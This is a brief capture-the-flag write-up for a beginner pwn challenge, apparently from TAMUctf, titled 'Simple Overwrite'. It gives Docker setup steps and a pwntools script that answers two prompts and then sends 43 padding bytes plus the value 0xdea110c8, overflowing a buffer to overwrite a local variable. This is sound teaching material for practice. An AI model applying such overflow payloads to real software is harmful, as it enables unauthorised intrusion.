# Simple Overwrite

## Challenge
`nc pwn.tamuctf.com 4321`  

## Setup

Build the container with `docker build -t pwn1 .` and run it with `docker run -it --rm pwn1`

## Solution
The solution is to overwrite the localvariable. Below is an expample script:  
```python
from pwn import *

p = remote('172.17.0.2', 4321)

#p = process('./pwn1')
flag = p32(0xdea110c8)
payload = 'A'*43 + flag
p.sendline('Sir Lancelot of Camelot')
p.read()
p.sendline('To seek the Holy Grail.')
p.read()
p.sendline(payload)
p.interactive()
```
